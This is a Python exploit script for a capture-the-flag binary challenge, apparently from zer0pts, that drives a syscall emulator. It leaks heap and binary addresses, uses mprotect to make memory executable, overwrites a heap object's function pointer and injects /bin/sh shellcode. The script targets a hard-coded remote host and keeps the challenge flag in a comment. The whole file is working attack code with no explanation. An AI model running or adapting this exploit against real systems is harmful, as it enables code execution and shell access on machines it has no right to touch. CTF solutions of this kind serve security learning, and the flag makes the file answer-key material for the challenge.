#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'18.179.178.246', 'port':9006})
env.select()

#==========

binf = ELF(bin_file)
offset_emulator_set     = binf.sep_function['_ZN8Emulator3setENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERm']

#==========

def attack(conn, **kwargs):
    sys = Syscall(conn)

    sys.run(constants.SYS_brk, [0,0,0])

    addr_heap_base      = sys.getret() - 0x21000
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
    addr_heap_emulator  = addr_heap_base + 0x11e70

    sys.run(constants.SYS_writev, [constants.STDOUT_FILENO, addr_heap_emulator, 1])
    addr_emulator_set = u64(conn.recv(8))
    binf.address = addr_emulator_set - offset_emulator_set
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))
    addr_emulator_check     = binf.sep_function['_ZN8Emulator5checkEv']

    sys.run(constants.SYS_mprotect, [binf.address, 0x2000, constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC])

    shellcode = asm(shellcraft.sh())

    exploit  = p64(0)*2
    exploit += p64(0xf171)
    exploit += p64(addr_emulator_check)
    exploit += p64(len(shellcode))

    sys.run(constants.SYS_readv, [constants.STDIN_FILENO, addr_heap_emulator + 0x18, len(exploit)])
    conn.send(exploit)

    sys.run(constants.SYS_readv, [constants.STDIN_FILENO, addr_heap_emulator + 0x30, 1])
    conn.send(shellcode)

    sys.run(-1, [0,0,0])

class Syscall:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def run(self, sysno, args):
        assert(len(args) == 3)

        self.sendlineafter('syscall: ', str(int(sysno)))
        self.sendlineafter('arg1: ', str(int(args[0])))
        self.sendlineafter('arg2: ', str(int(args[1])))
        self.sendlineafter('arg3: ', str(int(args[2])))
        self.recvuntil('===\n')

    def getret(self):
        self.recvuntil('retval: ')
        return int(self.recvuntil('\n', drop=True), 16)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # zer0pts{n0_w4y!_i_b4nn3d_3v3ry_d4ng3r0us_sysc4ll!}

if __name__=='__main__':
    main()

#==========
